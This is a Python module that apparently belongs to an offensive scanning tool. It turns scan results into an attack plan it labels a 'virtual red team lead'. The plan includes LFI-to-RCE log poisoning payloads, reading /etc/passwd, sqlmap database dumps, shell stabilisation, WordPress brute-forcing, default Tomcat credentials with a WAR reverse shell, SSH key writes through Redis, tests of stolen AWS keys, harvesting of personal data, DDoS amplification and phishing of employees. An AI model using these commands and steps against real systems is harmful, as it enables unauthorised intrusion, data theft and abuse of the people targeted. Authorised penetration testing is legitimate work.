#Ai_Strategist.py
#Date-13/12/2025
#update_On - 16/02/2026
#Author- Lokesh Kumar 
#github - @trmxvibs
#Madeinindia

import re

def analyze_attack_strategy(scan_result, tech_list):
    # Convert list to string for easier searching if it's a list
    tech_str = str(tech_list) if isinstance(tech_list, list) else str(tech_list)
    
    strategy = ["\n[*] CORTEX AI STRATEGY (VIRTUAL RED TEAM LEAD):"]
    steps = []

    # --- PHASE 1: CRITICAL EXPLOITATION (The "Kill" Chain) ---
    if "[☠️]" in scan_result:
        strategy.append("   [🔥] IMMEDIATE ACTION REQUIRED (Critical Vulns Found):")
        
        if "LFI DETECTED" in scan_result:
            steps.append("1. LFI to RCE: Attempt Log Poisoning (Apache/SSH logs).")
            steps.append("   > Payload: /?page=/var/log/auth.log&cmd=id")
            if "Linux" in scan_result:
                steps.append("   > Data Exfil: Read /proc/self/environ or /etc/passwd")
        
        if "SQLi CONFIRMED" in scan_result:
            steps.append("1. Database Dump: Use SQLMap on identified endpoint.")
            steps.append("   > Cmd: sqlmap -u <target_url> --batch --dbs --level=5 --risk=3")
            
        if "RCE DETECTED" in scan_result:
            steps.append("1. Shell Stabilization: Upgrade your shell immediately.")
            steps.append("   > Py: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
            
        if "GIT REPO EXPOSED" in scan_result:
            steps.append("1. Source Code Theft: Use 'git-dumper' to download entire repo.")
            steps.append("2. Secret Hunting: Run 'trufflehog' on downloaded folder.")

        if "BOLA/IDOR" in scan_result:
            steps.append("1. Data Harvesting: Write a script to iterate IDs (0-10000).")
            steps.append("2. PII Extraction: Look for emails/phones in JSON response.")

    # --- PHASE 2: TECHNOLOGY-SPECIFIC VECTORS ---
    strategy.append("\n   [⚗️] TECH-SPECIFIC ATTACK VECTOR:")
    
    # CMS Strategies
    if "WordPress" in tech_str or "wp-content" in scan_result:
        steps.append("   [WP] WordPress Identified:")
        steps.append("       > User Enum: wpscan --url <target> --enumerate u")
        steps.append("       > Brute Force: wpscan --url <target> --passwords rockyou.txt")
        if "xmlrpc" in scan_result:
            steps.append("       > XML-RPC is active: Use it for amplification DDoS or Brute-force.")

    # Framework Strategies
    if "Django" in tech_str or "csrftoken" in scan_result:
        steps.append("   [PY] Django Framework:")
        steps.append("       > Debug Mode: Check if /admin gives a traceback (Info Leak).")
        steps.append("       > Admin Panel: Brute-force /admin/login/")
        
    if "Laravel" in tech_str:
        steps.append("   [PHP] Laravel Framework:")
        steps.append("       > APP_KEY: Check if .env is exposed (RCE possible via deserialization).")
        steps.append("       > Debug: Check /telescope or /horizon endpoints.")

    # Server Strategies
    if "Tomcat" in scan_result or "8080" in scan_result:
        steps.append("   [JAVA] Apache Tomcat:")
        steps.append("       > Manager App: Try 'tomcat/s3cret' or 'admin/admin'.")
        steps.append("       > WAR Upload: If access gained, upload a .war reverse shell.")
        
    if "Redis" in scan_result or "6379" in scan_result:
        steps.append("   [DB] Redis Service:")
        steps.append("       > Unauth Access: Try 'redis-cli -h <target>' directly.")
        steps.append("       > RCE: Try writing SSH keys via 'config set dir /root/.ssh/'.")

    # --- PHASE 3: INFRASTRUCTURE & CLOUD ---
    if "KEYS FOUND" in scan_result or "[$$$]" in scan_result:
        steps.append("\n   [☁️] CLOUD & API ENTRY:")
        steps.append("       > AWS/Google Keys: Configure CLI and try 'aws s3 ls'.")
        steps.append("       > Stripe/Mailgun: Check usage limits to confirm validity.")

    # --- PHASE 4: LAST RESORT (Social Engineering) ---
    if not steps:
        strategy.append("   [i] Target appears hardened (High Security Maturity).")
        strategy.append("   [?] Recommended Next Steps:")
        strategy.append("       1. Phishing: Target employees via LinkedIn (OSINT).")
        strategy.append("       2. Subdomain Monitoring: Wait for new dev environments.")
        strategy.append("       3. Supply Chain: Check 3rd party JS scripts used by site.")
    else:
        # Add generated steps to strategy
        for step in steps:
            strategy.append(f"   {step}")

    return "\n".join(strategy)
